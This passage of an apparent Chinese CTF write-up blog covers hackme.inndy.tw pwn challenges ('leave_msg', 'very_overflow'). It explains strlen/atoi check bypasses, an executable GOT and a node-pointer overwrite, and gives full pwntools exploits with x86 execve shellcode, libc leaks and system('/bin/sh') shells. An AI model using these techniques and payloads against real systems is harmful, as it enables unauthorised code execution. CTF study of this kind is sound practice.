-&gt; ')libc_main_addr = (int(p.recvuntil('\n')[:-1],10)&amp;0xffffffff)-247offset = libc_main_addr - libc.symbols['__libc_start_main']system_libc = libc.symbols['system']binsh_libc = libc.search("/bin/sh").next()system_addr = system_libc + offsetbinsh_addr = binsh_libc + offsetlog.info("libc_main_addr --&gt; &#123;&#125;".format(hex(libc_main_addr)))log.info("offset --&gt; &#123;&#125;".format(hex(offset)))log.info("system_addr --&gt; &#123;&#125;".format(hex(system_addr)))log.info("binsh_addr --&gt; &#123;&#125;".format(hex(binsh_addr)))pause()p.recvuntil('Cmd &gt;&gt;\n')p.sendline('c')p.recvuntil('Cmd &gt;&gt;\n')p.sendline('p')p.recvuntil('Cmd &gt;&gt;\n')# 写入binshp.sendline('i\n94')p.recvuntil('Cmd &gt;&gt;\n')p.sendline('i')push_binsh = 0xffffffff - binsh_addr+1payload = '-' + str(push_binsh)print payloadp.sendline(payload)# 写入system_addrfor i in range(3): p.recvuntil('Cmd &gt;&gt;\n') p.sendline('p')p.recvuntil('Cmd &gt;&gt;\n')p.sendline('i')push_system = 0xffffffff - system_addr + 1payload = '-' + str(push_system)p.sendline(payload)p.recvuntil('Cmd &gt;&gt;\n')p.sendline('x')p.interactive() leave_msg这一题可真是长姿势了呀，主要的知识有： strlen函数遇到&#39;\x00&#39;就会停止计算长度 atoi函数会跳过字符串前面的空格或者换行符，直到遇到数字才进行转换 也是最骚的，got表不一定是写入地址，也可以写入可执行代码（在特定的条件下：比如这一题got表是可执行的，就可以） 其实一开始分析main函数的时候，就发现了改写got表的漏洞，但是因为既加了长度限定，又加了负数检测，一时间就卡住不知如何下手，但其实这几处保护是有缺陷的，这就涉及到了我上面讲到的3点知识，只要我们在8个字符后加&#39;\x00&#39;就可以路过strlen继续往栈输入内容，对于负数检测因为nptr是输入字符串的第一个字符，所以我们只要输入空格+负数，就可以跳这个检测了。接下来就是核心了，因为你会发现虽然可以修改got表了，但是，修改成哪个地址？这处程序既没有后门函数，也没有可泄漏地址的漏洞。 这里可以看到 0x804a000 到 0x804b000 居然是可执行的，这就说明我们可以修改got表为可执行代码了，但是同样有个问题就是，可写的代码长度只有8，所以是无法构造shellcode的，只能进行间接的跳转，而且程序的保护并没有开启NX，所以可以往栈里写入shellcode 然后修改got表为add esp ,*** jmp esp执行shellcode，所以接下来就是要先确定好这个偏移 构造一个&#39;a&#39;*8 + &#39;\x00&#39; + &#39;b&#39;*8这样&#39;a&#39;*8就会写入到puts的got表，整个buf也会写到栈中去，再在下一次的puts处下断点查看偏移：0x0804861d si，进入puts函数内部，这里就可以看到输入的字符相对esp的偏移是0x30，而我们的shellcode是在’\x00’后面，也就是’b’*8，所以got表中的跳转代码就应该是add esp,0x30+len(jmp)+1 ; jmp esp，就可以指向shellcode 了 exp: 12345678910111213141516171819202122232425262728#-*-coding:utf-8-*-from pwn import *# p = process('./leave_msg')p = remote("hackme.inndy.tw","7715")context.log_level = 'debug'# 覆盖printf的got表 -76/4# 覆盖puts的got表 -64/4shellcode_x86 = "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73"shellcode_x86 += "\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0"shellcode_x86 += "\x0b\xcd\x80"jmp = '''add esp,0x36jmp esp'''jmp = asm(jmp)log.info("jmp_len --&gt; &#123;&#125;".format(len(jmp))) #5pause()p.recvuntil("message:\n")payload = jmppayload += '\x00'payload += shellcode_x86# p.sendline("aaaaaaaa\x00bbbbbbbb") # 跟esp的偏移是0x30(+9?就是'bbbbbbbb'跟 esp的偏移)p.sendline(payload)p.recvuntil("slot?\n")# gdb.attach(p,"b *0x8048661")# pause()p.sendline(" -16")p.interactive() very_overflow这题就有意思了，同样是可以实现任意地址读写，不过这次是通过控制结构体的指针来实现，不过这里定义的结构体有点简单，只有指向下一个结构体的指针next和数据data 先add 一个数据进去，在gdb中下断点看一下情况 在这里可以看到结构体在栈中的存储方式是 node-&gt;next node-&gt;data（不明白aa上面为什么是next指针的话，可以再add一个然后查看栈就明白了）而且node-&gt;next = (node + strlen(node-&gt;data) + 5);，所以当add多个node的时候，next跟data是紧挨着排下来的，data跟next中间只隔着一个&#39;\x00&#39;，我一开始在知道这个布局后并没有想到什么有用的利用条件（还是太菜了），但是正常这样紧挨着的布局，使得一种可能：修改node[0]的data从而覆盖node[1]在next达到控制next指针的目的，控制了指向就可以任意地址读写了。 因为show函数会将next指向打印出来，这样就知道了栈地址，计算出node[0]-&gt;next跟libc_start_main的偏移，就可以修改指向通过show将它打印出来，接下来算出system的真实地址用同样的方法写入到返回地址处就行了 exp: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374#-*-coding:utf-8-*-from pwn import *context.log_level = 'debug'# p = process('./very_overflow')p = remote("hackme.inndy.tw","7705")elf = ELF('./very_overflow')libc = ELF('./libc-2.23.so.i386')# libc = elf.libcp.recvuntil('Your action: ')p.sendline('1')p.recvuntil('Input your note: ')p.sendline('ab')p.recvuntil('Your action: ')p.sendline('1')p.recvuntil('Input your note: ')p.sendline('ab')# 得到node[0]-&gt;next,进而计算出libc_start_main的位置 p.recvuntil('Your action: ')p.sendline('3')p.recvuntil('Which note to show: ')p.sendline('0')p.recvuntil('Next note: ')main_addr = int(p.recv(10),16) + 0x4228ret_addr = main_addr - 0x4228 - 0x2clog.info("point to libc_main --&gt; &#123;&#125;".format(hex(main_addr)))log.info("ret_addr --&gt; &#123;&#125;".format(hex(ret_addr)))# pause()# 修改指针指向libc_start_mainp.recvuntil('Your action: ')p.sendline('2')p.recvuntil('Which note to edit: ')p.sendline('0')p.recvuntil('Your new data: ')# gdb.attach(p,"b *0x8048705")# pause()p.sendline('aaaa'+p32(main_addr))# show libc_start_mainp.recvuntil('Your action: ')p.sendline('3')p.recvuntil('Which note to show: ')# gdb.attach(p,"b*0x804879c")# pause()p.sendline('2')p.recvuntil('Next note: ')libc_main = int(p.recv(10),16)-247log.info("libc_main --&gt; &#123;&#125;".format(hex(libc_main)))# pause()offset = libc_main - libc.symbols['__libc_start_main']system_addr = offset + libc.symbols['system']binsh_addr = offset + libc.search("/bin/sh").next()log.info("system_addr --&gt; &#123;&#125;".format(hex(system_addr)))log.info("binsh_addr --&gt; &#123;&#125;".format(hex(binsh_addr)))# pause()# 修改指针指向ret地址上一个位置（即将ret地址当作node-&gt;data)p.recvuntil('Your action: ')p.sendline('2')p.recvuntil('Which note to edit: ')p.sendline('0')p.recvuntil('Your new data: ')# gdb.attach(p,"b *0x8048705")# pause()p.sendline('aaaa'+p32(ret_addr))# 写入p.recvuntil('Your action: ')p.sendline('2')p.recvuntil('Which note to edit: ')p.sendline('2')p.recvuntil('Your new data: ')payload = p32(system_addr) + 'bbbb' + p32(binsh_addr)# gdb.attach(p,"b *0x8048705")# pause()p.sendline(payload)p.interactive()]]></content>
  </entry>
</search>
